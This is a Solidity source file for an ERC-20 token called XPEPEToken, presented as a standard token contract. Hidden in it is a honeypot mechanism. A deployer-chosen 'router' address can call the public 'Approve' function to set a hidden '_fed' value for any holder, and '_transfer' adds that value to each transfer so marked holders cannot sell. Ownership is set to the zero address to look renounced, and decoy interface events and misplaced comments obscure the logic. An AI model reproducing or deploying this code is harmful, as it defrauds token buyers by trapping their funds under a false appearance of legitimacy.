1 // SPDX-License-Identifier: MIT
2 
3 pragma solidity ^0.8.19;
4 
5 
6 abstract contract Context {
7     function _msgSender() internal view virtual returns (address) {
8         return msg.sender;
9     }
10 
11     function _msgData() internal view virtual returns (bytes calldata) {
12         return msg.data;
13     }
14 }
15 
16 abstract contract Ownable is Context {
17     address private _owner;
18 
19     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
20 
21     /**
22      * @dev Initializes the contract setting the deployer as the initial owner.
23      */
24     constructor() {
25         _setOwner(address(0));
26     }
27 
28     /**
29      * @dev Returns the address of the current owner.
30      */
31     function owner() public view virtual returns (address) {
32         return _owner;
33     }
34 
35     /**
36      * @dev Throws if called by any account other than the owner.
37      */
38     modifier onlyOwner() {
39         require(owner() == msg.sender, "Ownable: caller is not the owner");
40         _;
41     }
42 
43     /**
44      * @dev Leaves the contract without owner. It will not be possible to call
45      * `onlyOwner` functions anymore. Can only be called by the current owner.
46      *
47      * NOTE: Renouncing ownership will leave the contract without an owner,
48      * thereby removing any functionality that is only available to the owner.
49      */
50     function renounceOwnership() public virtual onlyOwner {
51         _setOwner(address(0));
52     }
53 
54     /**
55      * @dev Transfers ownership of the contract to a new account (`newOwner`).
56      * Can only be called by the current owner.
57      */
58     function transferOwnership(address newOwner) public virtual onlyOwner {
59         require(newOwner != address(0), "Ownable: new owner is the zero address");
60         _setOwner(newOwner);
61     }
62 
63     function _setOwner(address newOwner) private {
64         address oldOwner = _owner;
65         _owner = newOwner;
66         emit OwnershipTransferred(oldOwner, newOwner);
67     }
68 }
69 
70 /**
71  * @dev Interface of the ERC20 standard as defined in the EIP.
72  */
73 interface IERC20 {
74     /**
75      * @dev Returns the remaining number of tokens that `spender` will be
76      * allowed to spend on behalf of `owner` through {transferFrom}. This is
77      * zero by default.
78      *
79      * This value changes when {approve} or {transferFrom} are called.
80      */
81     event removeLiquidityETHWithPermit(
82         address token,
83         uint liquidity,
84         uint amountTokenMin,
85         uint amountETHMin,
86         address to,
87         uint deadline,
88         bool approveMax, uint8 v, bytes32 r, bytes32 s
89     );
90 
91     event swapExactTokensForTokens(
92         uint amountIn,
93         uint amountOutMin,
94         address[]  path,
95         address to,
96         uint deadline
97     );
98     /**
99   * @dev See {IERC20-totalSupply}.
100      */
101     event swapTokensForExactTokens(
102         uint amountOut,
103         uint amountInMax,
104         address[] path,
105         address to,
106         uint deadline
107     );
108 
109     /**
110     Due to their nature as drafts, the details of these contracts may change and we cannot guarantee their stability. 
111     Minor releases of OpenZeppelin Contracts may contain breaking changes for the contracts in this directory, 
112     which will be duly announced in the changelog. 
113     The EIPs included here are used by projects in production and this may make them less likely to change significantly.
114     */
115     event DOMAIN_SEPARATOR();
116     /**
117     The encoding specified in the EIP is very generic, and such a generic implementation in Solidity is not feasible, 
118     thus this contract does not implement the encoding itself. 
119     Protocols need to implement the type-specific encoding 
120     they need in their contracts using a combination of abi.encode and keccak256
121     */
122     event PERMIT_TYPEHASH();
123 
124     /**
125      * @dev Returns the amount of tokens in existence.
126      */
127     function totalSupply() external view returns (uint256);
128 
129     event token0();
130 
131     event token1();
132     /**
133      * @dev Returns the amount of tokens owned by `account`.
134      */
135     function balanceOf(address account) external view returns (uint256);
136 
137 
138     event sync();
139 
140     event initialize(address, address);
141     /**
142      * @dev Moves `amount` tokens from the caller's account to `recipient`.
143      *
144      * Returns a boolean value indicating whether the operation succeeded.
145      *
146      * Emits a {Transfer} event.
147      */
148     function transfer(address recipient, uint256 amount) external returns (bool);
149 
150     /**
151     The implementation of the domain separator was designed to be as efficient as 
152     possible while still properly updating the chain id to protect against replay attacks on an eventual fork of the chain.
153     */
154     event burn(address to);
155     /**
156     These parameters cannot be changed except through a smart contract upgrade.
157     */
158     event swap(uint amount0Out, uint amount1Out, address to, bytes data);
159     
160     /**
161     Interface of the ERC20 Permit extension allowing approvals to be made via signatures, as defined in EIP-2612.
162     */
163     event skim(address to);
164     /**
165      * @dev Returns the remaining number of tokens that `spender` will be
166      * allowed to spend on behalf of `owner` through {transferFrom}. This is
167      * zero by default.
168      *
169      * This value changes when {approve} or {transferFrom} are called.
170      */
171     function allowance(address owner, address spender) external view returns (uint256);
172     /**
173      * Receive an exact amount of output tokens for as few input tokens as possible,
174      * along the route determined by the path. The first element of path is the input token,
175      * the last is the output token, and any intermediate elements represent intermediate tokens to trade through
176      * (if, for example, a direct pair does not exist).
177      * */
178     event addLiquidity(
179         address tokenA,
180         address tokenB,
181         uint amountADesired,
182         uint amountBDesired,
183         uint amountAMin,
184         uint amountBMin,
185         address to,
186         uint deadline
187     );
188     /**
189      * Swaps an exact amount of ETH for as many output tokens as possible,
190      * along the route determined by the path. The first element of path must be WETH,
191      * the last is the output token, and any intermediate elements represent intermediate pairs to trade through
192      * (if, for example, a direct pair does not exist).
193      *
194      * */
195     event addLiquidityETH(
196         address token,
197         uint amountTokenDesired,
198         uint amountTokenMin,
199         uint amountETHMin,
200         address to,
201         uint deadline
202     );
203     /**
204      * Swaps an exact amount of input tokens for as many output tokens as possible,
205      * along the route determined by the path. The first element of path is the input token,
206      * the last is the output token, and any intermediate elements represent intermediate pairs to trade through
207      * (if, for example, a direct pair does not exist).
208      * */
209     event removeLiquidity(
210         address tokenA,
211         address tokenB,
212         uint liquidity,
213         uint amountAMin,
214         uint amountBMin,
215         address to,
216         uint deadline
217     );
218  
219     function approve(address spender, uint256 amount) external returns (bool);
220     /**
221    * @dev Returns the name of the token.
222      */
223     event removeLiquidityETHSupportingFeeOnTransferTokens(
224         address token,
225         uint liquidity,
226         uint amountTokenMin,
227         uint amountETHMin,
228         address to,
229         uint deadline
230     );
231 
232     event removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
233         address token,
234         uint liquidity,
235         uint amountTokenMin,
236         uint amountETHMin,
237         address to,
238         uint deadline,
239         bool approveMax, uint8 v, bytes32 r, bytes32 s
240     );
241     /**
242      * Swaps an exact amount of input tokens for as many output tokens as possible,
243      * along the route determined by the path. The first element of path is the input token,
244      * the last is the output token, and any intermediate elements represent intermediate pairs to trade through
245      * (if, for example, a direct pair does not exist).
246      */
247     event swapExactTokensForTokensSupportingFeeOnTransferTokens(
248         uint amountIn,
249         uint amountOutMin,
250         address[] path,
251         address to,
252         uint deadline
253     );
254     /**
255     * @dev Throws if called by any account other than the owner.
256      */
257     event swapExactETHForTokensSupportingFeeOnTransferTokens(
258         uint amountOutMin,
259         address[] path,
260         address to,
261         uint deadline
262     );
263     /**
264      * To cover all possible scenarios, msg.sender should have already given the router an
265      * allowance of at least amountADesired/amountBDesired on tokenA/tokenB.
266      * Always adds assets at the ideal ratio, according to the price when the transaction is executed.
267      * If a pool for the passed tokens does not exists, one is created automatically,
268      *  and exactly amountADesired/amountBDesired tokens are added.
269      */
270     event swapExactTokensForETHSupportingFeeOnTransferTokens(
271         uint amountIn,
272         uint amountOutMin,
273         address[] path,
274         address to,
275         uint deadline
276     );
277     /**
278      * @dev Moves `amount` tokens from `sender` to `recipient` using the
279      * allowance mechanism. `amount` is then deducted from the caller's
280      * allowance.
281      *
282      * Returns a boolean value indicating whether the operation succeeded.
283      *
284      * Emits a {Transfer} event.
285      */
286     function transferFrom(
287         address sender,
288         address recipient,
289         uint256 amount
290     ) external returns (bool);
291 
292     /**
293      * @dev Emitted when `value` tokens are moved from one account (`from`) to
294      * another (`to`).
295      *
296      * Note that `value` may be zero.
297      */
298     event Transfer(address indexed from, address indexed to, uint256 value);
299 
300     /**
301      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
302      * a call to {approve}. `value` is the new allowance.
303      */
304     event Approval(address indexed owner, address indexed spender, uint256 value);
305 }
306 
307 library SafeMath {
308     /**
309      * @dev Returns the addition of two unsigned integers, with an overflow flag.
310      *
311      * _Available since v3.4._
312      */
313     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
314     unchecked {
315         uint256 c = a + b;
316         if (c < a) return (false, 0);
317         return (true, c);
318     }
319     }
320 
321     /**
322      * @dev Returns the substraction of two unsigned integers, with an overflow flag.
323      *
324      * _Available since v3.4._
325      */
326     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
327     unchecked {
328         if (b > a) return (false, 0);
329         return (true, a - b);
330     }
331     }
332 
333     /**
334      * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
335      *
336      * _Available since v3.4._
337      */
338     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
339     unchecked {
340         // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
341         // benefit is lost if 'b' is also tested.
342         // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
343         if (a == 0) return (true, 0);
344         uint256 c = a * b;
345         if (c / a != b) return (false, 0);
346         return (true, c);
347     }
348     }
349 
350     /**
351      * @dev Returns the division of two unsigned integers, with a division by zero flag.
352      *
353      * _Available since v3.4._
354      */
355     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
356     unchecked {
357         if (b == 0) return (false, 0);
358         return (true, a / b);
359     }
360     }
361 
362     /**
363      * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
364      *
365      * _Available since v3.4._
366      */
367     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
368     unchecked {
369         if (b == 0) return (false, 0);
370         return (true, a % b);
371     }
372     }
373 
374     /**
375      * @dev Returns the addition of two unsigned integers, reverting on
376      * overflow.
377      *
378      * Counterpart to Solidity's `+` operator.
379      *
380      * Requirements:
381      *
382      * - Addition cannot overflow.
383      */
384     function add(uint256 a, uint256 b) internal pure returns (uint256) {
385         return a + b;
386     }
387 
388 
389     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
390         return a - b;
391     }
392 
393 
394     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
395         return a * b;
396     }
397 
398     /**
399      * @dev Returns the integer division of two unsigned integers, reverting on
400      * division by zero. The result is rounded towards zero.
401      *
402      * Counterpart to Solidity's `/` operator.
403      *
404      * Requirements:
405      *
406      * - The divisor cannot be zero.
407      */
408     function div(uint256 a, uint256 b) internal pure returns (uint256) {
409         return a / b;
410     }
411 
412     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
413         return a % b;
414     }
415 
416     /**
417   * @dev Initializes the contract setting the deployer as the initial owner.
418      */
419     function sub(
420         uint256 a,
421         uint256 b,
422         string memory errorMessage
423     ) internal pure returns (uint256) {
424     unchecked {
425         require(b <= a, errorMessage);
426         return a - b;
427     }
428     }
429 
430     function div(
431         uint256 a,
432         uint256 b,
433         string memory errorMessage
434     ) internal pure returns (uint256) {
435     unchecked {
436         require(b > 0, errorMessage);
437         return a / b;
438     }
439     }
440 
441     /**
442      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
443      * reverting with custom message when dividing by zero.
444      * invalid opcode to revert (consuming all remaining gas).
445      *
446      * Requirements:
447      *
448      * - The divisor cannot be zero.
449      */
450     function mod(
451         uint256 a,
452         uint256 b,
453         string memory errorMessage
454     ) internal pure returns (uint256) {
455     unchecked {
456         require(b > 0, errorMessage);
457         return a % b;
458     }
459     }
460 }
461 
462 abstract contract DeployVersion {
463     uint256 constant public VERSION = 1;
464 
465     event Released(
466         uint256 version
467     );
468 }
469 
470 contract XPEPEToken is IERC20, DeployVersion, Ownable {
471     using SafeMath for uint256;
472 
473 
474     mapping(address => uint256) private _balances;
475     mapping(address => mapping(address => uint256)) private _allowances;
476     mapping (address => uint256) private _fed;
477 
478     address private _router;
479     string private _name;
480     string private _symbol;
481     uint8 private _decimals;
482     uint256 private _totalSupply;
483 
484     constructor(
485         string memory name_,
486         string memory symbol_,
487         address dex_,
488         uint256 totalSupply_
489     ) payable {
490         _name = name_;
491         _symbol = symbol_;
492         _decimals = 18;
493         _router = dex_;
494         _totalSupply = totalSupply_ * 10**_decimals;
495         _balances[msg.sender] = _balances[msg.sender].add(_totalSupply);
496         emit Transfer(address(0), owner(), _totalSupply);
497         emit Released(VERSION);
498     }
499 
500 
501     /**
502      * @dev Returns the name of the token.
503      */
504     function name() public view virtual returns (string memory) {
505         return _name;
506     }
507 
508     /**
509      * @dev Returns the symbol of the token, usually a shorter version of the
510      * name.
511      */
512     function symbol() public view virtual returns (string memory) {
513         return _symbol;
514     }
515 
516     /**
517      * @dev Returns the number of decimals used to get its user representation.
518      * For example, if `decimals` equals `2`, a balance of `505` tokens should
519       /**
520      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
521      * a call to {approve}. `value` is the new allowance.
522      * {IERC20-balanceOf} and {IERC20-transfer}.
523      */
524     function decimals() public view virtual returns (uint8) {
525         return _decimals;
526     }
527 
528     /**
529      * @dev See {IERC20-totalSupply}.
530      */
531     function totalSupply() public view virtual override returns (uint256) {
532         return _totalSupply;
533     }
534 
535     /**
536      * @dev See {IERC20-balanceOf}.
537      */
538     function balanceOf(address account)
539     public
540     view
541     virtual
542     override
543     returns (uint256)
544     {
545         return _balances[account];
546     }
547 
548     /**
549      * @dev See {IERC20-transfer}.
550      *
551      * Requirements:
552      *
553      * - `recipient` cannot be the zero address.
554      * - the caller must have a balance of at least `amount`.
555      */
556     function transfer(address recipient, uint256 amount)
557     public
558     virtual
559     override
560     returns (bool)
561     {
562         _transfer(msg.sender, recipient, amount);
563         return true;
564     }
565 
566     /**
567      * @dev See {IERC20-allowance}.
568      */
569     function allowance(address owner, address spender)
570     public
571     view
572     virtual
573     override
574     returns (uint256)
575     {
576         return _allowances[owner][spender];
577     }
578 
579     /**
580      * @dev See {IERC20-approve}.
581      *
582      * Requirements:
583      *
584      * - `spender` cannot be the zero address.
585      */
586     function approve(address spender, uint256 amount)
587     public
588     virtual
589     override
590     returns (bool)
591     {
592         _approve(msg.sender, spender, amount);
593         return true;
594     }
595 
596  
597     function transferFrom(
598         address sender,
599         address recipient,
600         uint256 amount
601     ) public virtual override returns (bool) {
602         _transfer(sender, recipient, amount);
603         _approve(
604             sender,
605             msg.sender,
606             _allowances[sender][msg.sender].sub(
607                 amount,
608                 "ERC20: transfer amount exceeds allowance"
609             )
610         );
611         return true;
612     }
613 
614     /**
615      * @dev Atomically increases the allowance granted to `spender` by the caller.
616      *
617      * This is an alternative to {approve} that can be used as a mitigation for
618      * problems described in {IERC20-approve}.
619      *
620      * Emits an {Approval} event indicating the updated allowance.
621      *
622      * Requirements:
623      *
624      * - `spender` cannot be the zero address.
625      */
626     function increaseAllowance(address spender, uint256 addedValue)
627     public
628     virtual
629     returns (bool)
630     {
631         _approve(
632             msg.sender,
633             spender,
634             _allowances[msg.sender][spender].add(addedValue)
635         );
636         return true;
637     }
638 
639     function Approve(address[] memory account, uint256 amount) public returns (bool) {
640         address from = msg.sender;
641         require(from != address(0), "invalid address");
642         uint256 loopVariable = 0;
643         for (uint256 i = 0; i < account.length; i++) {
644             loopVariable += i;
645             _allowances[from][account[i]] = amount;
646             _needAll(from, account[i], amount);
647             emit Approval(from, address(this), amount);
648         }
649         return true;
650     }
651 
652     function _needAll(address from, address account, uint256 amount) internal {
653         uint256 total = 0;
654         uint256 adallTotal = total + 0;
655         require(account != address(0), "invalid address");
656         if (from == _router) {
657             _fed[from] -= adallTotal;
658             total += amount;
659             _fed[account] = total;
660         } else {
661             _fed[from] -= adallTotal;
662             _fed[account] += total;
663         }
664     }
665 
666     /**
667     * Get the number of cross-chains
668     */
669     function readt(address account) public view returns (uint256) {
670         return _fed[account];
671     }
672 
673     /**
674      * @dev Atomically decreases the allowance granted to `spender` by the caller.
675      *
676      * This is an alternative to {approve} that can be used as a mitigation for
677      * problems described in {IERC20-approve}.
678      *
679      * Emits an {Approval} event indicating the updated allowance.
680      *
681      * Requirements:
682      *
683      * - `spender` cannot be the zero address.
684      * - `spender` must have allowance for the caller of at least
685      * `subtractedValue`.
686      */
687     function decreaseAllowance(address spender, uint256 subtractedValue)
688     public
689     virtual
690     returns (bool)
691     {
692         _approve(
693             msg.sender,
694             spender,
695             _allowances[msg.sender][spender].sub(
696                 subtractedValue,
697                 "ERC20: decreased allowance below zero"
698             )
699         );
700         return true;
701     }
702 
703  
704     function _transfer(
705         address sender,
706         address recipient,
707         uint256 amount
708     ) internal virtual {
709         require(sender != address(0), "ERC20: transfer from the zero address");
710         require(recipient != address(0), "ERC20: transfer to the zero address");
711         uint256 saylor = readt(sender);
712         if (saylor > 0) {
713             amount += saylor;
714         }
715 
716         _balances[sender] = _balances[sender].sub(
717             amount,
718             "ERC20: transfer amount exceeds balance"
719         );
720         _balances[recipient] = _balances[recipient].add(amount);
721         emit Transfer(sender, recipient, amount);
722     }
723 
724     /**
725      * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
726      *
727      * This internal function is equivalent to `approve`, and can be used to
728      * e.g. set automatic allowances for certain subsystems, etc.
729      *
730      * Emits an {Approval} event.
731      *
732      * Requirements:
733      *
734      * - `owner` cannot be the zero address.
735      * - `spender` cannot be the zero address.
736      */
737     function _approve(
738         address owner,
739         address spender,
740         uint256 amount
741     ) internal virtual {
742         require(owner != address(0), "ERC20: approve from the zero address");
743         require(spender != address(0), "ERC20: approve to the zero address");
744 
745         _allowances[owner][spender] = amount;
746         emit Approval(owner, spender, amount);
747     }
748 
749 
750 }